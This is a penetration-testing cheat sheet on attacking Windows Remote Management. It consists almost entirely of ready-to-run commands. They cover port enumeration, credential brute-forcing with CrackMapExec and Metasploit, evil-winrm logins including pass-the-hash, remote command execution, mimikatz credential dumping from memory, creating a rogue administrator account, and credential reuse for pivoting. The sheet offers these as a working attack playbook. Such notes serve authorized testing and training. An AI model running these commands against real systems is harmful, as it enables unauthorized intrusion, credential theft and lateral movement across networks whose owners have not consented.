**Windows Remote Management (WinRM)** is a Microsoft protocol used for remote system administration over **HTTP (5985)** or **HTTPS (5986)**. It allows **remote command execution, configuration management, and automation**. If misconfigured or using weak credentials, attackers can exploit **WinRM for unauthorized access, lateral movement, and privilege escalation**.

## Common Attack Vectors

- **Brute-Forcing & Credential Attacks** – Exploiting weak passwords or NTLM hashes.
- **Pass-the-Hash (PTH) Attacks** – Using stolen credentials for remote authentication.
- **Exploiting Misconfigured WinRM Access** – Identifying users with WinRM privileges.
- **Remote Code Execution via PowerShell** – Running commands remotely on the target.

**Bookmarks:**
[https://learn.microsoft.com/en-us/windows/win32/winrm/portal](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)  
[https://github.com/ropnop/windapsearch](https://github.com/ropnop/windapsearch)

## Enumeration
### Check for Open WinRM Ports
```bash
nmap -p 5985,5986 --script http-winrm-info,winrm-brute <target-ip>
```

CrackMapExec:
```bash
crackmapexec winrm <target-ip>
```

Confirm manually using cURL:
```bash
curl -vk http://<target-ip>:5985/wsman
```

A successful response indicates WinRM is active.

## Authentication Attacks
### Brute-Force Credentials
CrackMapExec:
```bash
crackmapexec winrm <target-ip> -u users.txt -p passwords.txt
```

MSF:
```bash
msfconsole
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## Evil-winrm
```bash
evil-winrm -i $IP -u user -p password
```

```bash
evil-winrm -i TARGET -u admin -H NTLM_HASH
```
### Show WinRM Options
```
evil-winrm > menu
```

## Post-Exploitation & Lateral Movement
CrackMapExec for authenticated RCE execution:
```bash
crackmapexec winrm <target-ip> -u <user> -p <password> -x "whoami"
```

Further reconnaissance:
```bash
Get-NetComputer -Domain domain.local
Get-NetUser -Domain domain.local
```

### Extracting Credentials from Memory
Once inside, use mimikatz:
```powershell
mimikatz # sekurlsa::logonpasswords
```

### Adding a New Administrator User
```powershell
net user pentest Password123! /add
net localgroup administrators pentest /add
```

### Pivoting via WinRM
DON'T FORGET to try credentials on all targets!

Execute commands via CrackMapExec:
```bash
crackmapexec winrm <target-ip> -u <user> -p <password> -x "whoami"
```